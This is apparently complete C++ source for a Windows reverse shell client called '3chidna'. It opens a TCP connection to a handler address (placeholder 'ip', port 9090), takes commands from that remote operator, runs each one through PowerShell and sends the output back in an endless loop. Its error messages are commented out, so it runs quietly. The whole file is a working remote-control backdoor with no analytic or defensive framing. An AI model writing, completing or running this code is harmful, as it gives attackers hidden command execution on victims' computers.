#include <WinSock2.h>
#include <iostream>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

using namespace std;

class Process {
public:
    string exec(string command) {
        string completeCommand = "powershell -command " + command;
        array<char, 128> buffer;
        string result;
        shared_ptr<FILE> pipe(popen(completeCommand.c_str(), "r"), pclose);
        /*if (!pipe) {
            cout << "! popen() failed!" << endl;
        }*/

        while (!feof(pipe.get())) {
            if (fgets(buffer.data(), 128, pipe.get()) != nullptr) {
                result += buffer.data();
            }
        }

        return result + "\\n";
    }
};

class Client {
    private:
    WSADATA ws;

    int clientSocket = 0;

    struct sockaddr_in server;

    public:
    Client(const char* handlerIP, int handlerPort) {
        int wsaErr = WSAStartup(MAKEWORD(2, 2), &ws);
        if (wsaErr != 0) {
            //cout << "! WSADATA has not been able to be set" << endl;

            exit(1);
        }

        clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (clientSocket < 0) {
            //cout << "! Socket has been failed to create" << endl;

            exit(1);
        }

        int optval = 1;
        int socketSetError = setsockopt(clientSocket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval));
        if (socketSetError < 0) {
            //cout << "! Socket has not been able to set" << endl;

            exit(1);
        }

        u_long mode = 0;
        int ioctlErr = ioctlsocket(clientSocket, FIONBIO, &mode);
        if (ioctlErr != NO_ERROR) {
            //cout << "! Setting socket mode has been failed" << endl;

            exit(1);
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(handlerPort);
        server.sin_addr.s_addr = inet_addr(handlerIP);
        memset(&server.sin_zero, 0, sizeof(server.sin_zero));
    }
    
    void clientConnect() {
        connect(clientSocket, (struct sockaddr*)&server, sizeof(server));
        /*int connectError = connect(clientSocket, (struct sockaddr*)&server, sizeof(server));
        if (connectError < 0) {
            cout << "! Client failed to connect" << endl;
        } else {
            cout << "! Client has connected" << endl;
        }*/
    }

    void clientSend(const char *output) {
        int outputLength = static_cast<int>(strlen(output));
        int sendError = send(clientSocket, output, outputLength, 0);
        if (sendError < 0) {
            //cout << "! Client failed to send the output" << endl;

            closesocket(clientSocket);
        }
    }

    string clientReceive() {
        string data = "";

        while (true) {
            char buffer[1024] = { 0, };

            int bytesReceived = recv(clientSocket, buffer, 1024, 0);
            if (bytesReceived > 0) {
                data += buffer;

                int result = data.find("\\n");
                if (result != string::npos) {
                    string extractedData = "";
                    for (int i = 0; i < result; i++) {
                        extractedData += data[i];
                    }
                    data = extractedData;

                    break;
                }
            } else {
                closesocket(clientSocket);
                clientSocket = 0;

                break;
            }
        }

        return data;
    }

    /*~Client() {
        closesocket(serverSocket);
        WSACleanup();

        cout << "! Client socket has been closed and WSACleanup has been run" << endl;
    }*/
};

int main() {
    cout << "**3chidna**" << endl;

    Client client("ip", 9090);
    Process process;

    client.clientConnect();

    while (true) {
        string receivedData = client.clientReceive();

        string output = process.exec(receivedData);

        client.clientSend(output.c_str());
    }

    return 0;
}